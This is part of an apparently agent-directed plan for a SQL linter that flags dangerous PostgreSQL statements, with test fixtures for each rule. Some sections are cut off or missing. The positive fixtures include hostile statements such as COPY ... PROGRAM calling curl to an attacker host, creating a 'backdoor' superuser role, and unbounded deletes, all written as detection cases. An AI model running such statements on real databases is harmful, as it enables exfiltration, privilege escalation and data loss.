regression gate. Do not begin a phase until the previous phase
has passed its gate. Do not push at the end of any phase — push
only after Phase 5 passes the final gate AND I've reviewed.

most likely to introduce regressions, so they go LAST when the

PHASE 2 — AST-trivial batch A (SQL-016 through SQL-025)

SQL-016 — COPY ... FROM PROGRAM / COPY ... TO PROGRAM
  AST: CopyStmt with non-null `program` field.
  Block. Confidence 99.
  Positive fixtures:
    - COPY users FROM PROGRAM 'curl http://attacker.com/data'
    - COPY (SELECT * FROM users) TO PROGRAM 'curl -X POST ...'
    - copy users from program 'cmd' (lowercase)
  Negative fixtures:
    - COPY users FROM '/tmp/users.csv' (file, not program)
    - COPY (SELECT 1) TO STDOUT (legitimate)
    - INSERT INTO logs VALUES ('COPY FROM PROGRAM') (string literal)

SQL-017 — CREATE EXTENSION untrusted language
  AST: CreateExtensionStmt with extname in
       ['plpython3u', 'plperlu', 'plsh', 'plr', 'plpython2u',
        'plpythonu'].
  Block. Confidence 95.
  Positive fixtures:
    - CREATE EXTENSION plpython3u
    - CREATE EXTENSION IF NOT EXISTS plperlu
    - create extension "plsh" (quoted, lowercase)
  Negative fixtures:
    - CREATE EXTENSION pgcrypto
    - CREATE EXTENSION pg_stat_statements
    - CREATE EXTENSION vector

SQL-018 — ALTER TABLE DROP COLUMN
  AST: AlterTableStmt with cmd subtype DropColumn.
  Warn. Confidence 90.
  Positive fixtures:
    - ALTER TABLE users DROP COLUMN email
    - ALTER TABLE users DROP COLUMN email CASCADE
    - alter table users drop column "Email" if exists
  Negative fixtures:
    - ALTER TABLE users ADD COLUMN email text
    - ALTER TABLE users ALTER COLUMN email SET NOT NULL
    - ALTER TABLE users RENAME COLUMN email TO email_addr

SQL-019 — CREATE TRIGGER
  AST: CreateTrigStmt.
  Info. Confidence 75.
  Positive fixtures:
    - CREATE TRIGGER audit_trigger BEFORE INSERT ON users
      FOR EACH ROW EXECUTE FUNCTION log_event()
    - CREATE TRIGGER backdoor AFTER UPDATE ON sensitive_table
      EXECUTE FUNCTION evil()
    - CREATE OR REPLACE TRIGGER ... (Postgres 14+)
  Negative fixtures:
    - CREATE FUNCTION foo() RETURNS void AS $$ ... $$
    - DROP TRIGGER (different statement, handled by SQL-013
      relatives if applicable, but not here)
    - CREATE EVENT TRIGGER (different AST node, out of scope)

SQL-020 — CREATE OR REPLACE FUNCTION (overwrite signal)
  AST: CreateFunctionStmt with replace=true.
  Info. Confidence 70.
  Positive fixtures:
    - CREATE OR REPLACE FUNCTION audit_check() RETURNS void
      AS $$ ... $$
    - CREATE OR REPLACE FUNCTION foo(int) RETURNS int AS ...
  Negative fixtures:
    - CREATE FUNCTION foo() RETURNS void AS $$ ... $$
      (no OR REPLACE — first creation, lower risk)
    - CREATE OR REPLACE VIEW (different AST)

  NOTE: We can't tell from a single statement whether the
  function being replaced previously existed. The catch fires
  on the SYNTAX (CREATE OR REPLACE) which is the AI's stated
  intent — "I'm overwriting if it exists." That's the right
  granularity for static analysis.

SQL-021 — GRANT ... TO PUBLIC
  AST: GrantStmt with grantee containing 'PUBLIC'.
  Warn. Confidence 90.
  Positive fixtures:
    - GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC
    - GRANT SELECT ON users TO PUBLIC
    - GRANT EXECUTE ON FUNCTION foo() TO public, app_role
      (PUBLIC mixed with named role still fires)
  Negative fixtures:
    - GRANT SELECT ON users TO app_user
    - GRANT ALL ON SCHEMA app TO app_admin

SQL-022 — CREATE/ALTER ROLE WITH SUPERUSER
  AST: CreateRoleStmt or AlterRoleStmt with options containing
       'superuser' (case-insensitive).
  Block. Confidence 95.
  Positive fixtures:
    - CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x'
    - ALTER ROLE app_user WITH SUPERUSER
    - create role evil with superuser bypassrls
  Negative fixtures:
    - CREATE ROLE app_user LOGIN PASSWORD 'x' (no SUPERUSER)

SQL-023 — pg_terminate_backend / pg_cancel_backend
  AST: function call expression where funcname matches

SQL-024 — VACUUM FULL

SQL-031 — INSERT ON CONFLICT DO UPDATE (mass-overwrite signal)
  AST: InsertStmt with onConflictClause.action = ONCONFLICT_UPDATE
       AND the SELECT source has no LIMIT clause.
  Info. Configurable threshold (default ON, severity info).
  Positive fixtures:
    - INSERT INTO users (id, email) SELECT id, 'x' FROM users
      ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email
    - INSERT INTO settings SELECT * FROM other_settings
      ON CONFLICT (id) DO UPDATE SET value = EXCLUDED.value
  Negative fixtures:
    - INSERT INTO users (id, email) VALUES (1, 'a@b.c')
      ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email
      (single-row, no mass risk)
    - INSERT INTO users SELECT * FROM new_users LIMIT 100
      ON CONFLICT (id) DO UPDATE SET ...
      (bounded by LIMIT, lower risk)
    - INSERT INTO users (id) VALUES (1) ON CONFLICT DO NOTHING
      (no UPDATE branch — different shape)

SQL-032 — EXPLAIN ANALYZE wrapping destructive statement
  AST: ExplainStmt with analyze=true (or option 'ANALYZE')
       and the inner statement is UPDATE/DELETE/INSERT/DROP/
       TRUNCATE/ALTER.
  Info. Confidence 80.
  Positive fixtures:
    - EXPLAIN ANALYZE DELETE FROM users
    - EXPLAIN (ANALYZE, BUFFERS) UPDATE users SET active = false
    - EXPLAIN ANALYZE TRUNCATE users
  Negative fixtures:
    - EXPLAIN DELETE FROM users (no ANALYZE — just plans)
    - EXPLAIN ANALYZE SELECT * FROM users (read, not destructive)
    - EXPLAIN (BUFFERS) SELECT 1

SQL-033 — DO block (unparsed body)
  AST: DoStmt.
  Info. Confidence 70.
  This is the cheap mitigation. Do NOT attempt to parse the
  plpgsql body. Just flag the existence of any DO block with
  a clear message: "DO blocks contain procedural code that
  static analysis does not parse. Review the body manually
  for unbounded DELETE/UPDATE, DROP TABLE, or other destructive
  patterns."
  Positive fixtures:
    - DO $$ BEGIN DELETE FROM users; END $$
    - DO LANGUAGE plpgsql $$ BEGIN ... END $$
    - DO $$ BEGIN PERFORM dblink_connect(...); END $$
  Negative fixtures:
    - SELECT * FROM users WHERE name = 'do' (string, not DO block)
    - CREATE FUNCTION foo() AS $$ BEGIN ... END $$ LANGUAGE plpgsql
      (function definition, different AST node)

PHASE 5 — Semantic-analysis catches (SQL-034 through SQL-036)

These are the trickier ones. Implement carefully, with
extra-thorough false-positive testing.

SQL-034 — Literal tautology in WHERE
  AST: any Stmt with a WHERE clause where the where-expression
  is detected as a literal tautology.
  Block. Confidence 95.

  Tautology detector — implement these patterns and ONLY these:
    - A_Const with boolval=true:        WHERE true
    - A_Expr op='=' with both args identical A_Const:
                                         WHERE 1=1, WHERE 'x'='x'
    - A_Expr op='=' with both args same ColumnRef
      (deep-equal field names and table qualifiers):
                                         WHERE id=id, WHERE u.id=u.id
    - BoolExpr op=NOT containing A_Const boolval=false:
                                         WHERE NOT false
    - A_Expr op='IS NOT NULL' on a column reference is NOT
      detected as tautology (we don't have schema info to
      know if the column is NOT NULL). Document this in
      the rule's known-limitations.

  This rule applies to UPDATE, DELETE, MERGE, and SELECT
  statements. (Tautology in SELECT is less harmful but still
  an indicator of placeholder-not-replaced code.)

  Positive fixtures:
    - DELETE FROM users WHERE 1=1
    - UPDATE users SET banned = true WHERE id = id
    - DELETE FROM users WHERE true
    - UPDATE users SET x = 'y' WHERE NOT false
    - DELETE FROM users WHERE 'a' = 'a'
  Negative fixtures (must NOT fire):
    - DELETE FROM users WHERE id = 42
    - UPDATE users SET name = 'x' WHERE active = true
      (true is on right side, not the whole WHERE)
    - DELETE FROM users WHERE id IS NOT NULL
      (we don't detect this; documented limitation)
    - DELETE FROM users WHERE id IN (SELECT id FROM admins)
      (subquery — not a literal tautology even if always true)
    - DELETE FROM users WHERE 1=1 AND id = 42
      (compound — the AND with a real predicate makes it bounded)

  IMPORTANT: SQL-034 must not fire when the tautology is one
  branch of an AND/OR with a real predicate. Pattern:
  WHERE 1=1 AND <real predicate> should NOT fire. Document
  this so future contributors don't "fix" it into a regression.

SQL-035 — UPDATE ... FROM without join predicate
  AST: UpdateStmt where:
    - fromClause is non-empty (FROM is present)
    - whereClause is null OR whereClause does not reference
      any table from fromClause AND any column from the target.
  Block. Confidence 90.

  Detection logic: extract the target table alias and the
  fromClause table aliases. Walk the WHERE expression tree
  and collect all ColumnRef table qualifiers. If the WHERE
  doesn't qualify both the target and at least one fromClause
  table, this is a cartesian update.

  Positive fixtures:
    - UPDATE users SET status = 'x' FROM orders
    - UPDATE users u SET status = 'x' FROM orders o
      WHERE u.active (only references target, not orders)
    - UPDATE u SET status = 'x' FROM users u, orders o
      (no WHERE)
  Negative fixtures:
    - UPDATE users u SET status = 'x' FROM orders o
      WHERE u.id = o.user_id (proper join)
    - UPDATE users SET active = false WHERE id = 42
      (no FROM clause at all — out of this rule's scope;
      handled by SQL-003)

SQL-036 — DELETE ... USING without join predicate
  Same logic as SQL-035 but for DeleteStmt with usingClause.
  Block. Confidence 90.

  Positive fixtures:
    - DELETE FROM users USING orders
    - DELETE FROM users u USING orders o WHERE u.active
      (WHERE only references target)
  Negative fixtures:
    - DELETE FROM users u USING orders o
      WHERE u.id = o.user_id AND o.fraud
    - DELETE FROM users WHERE id = 42 (no USING — out of scope)
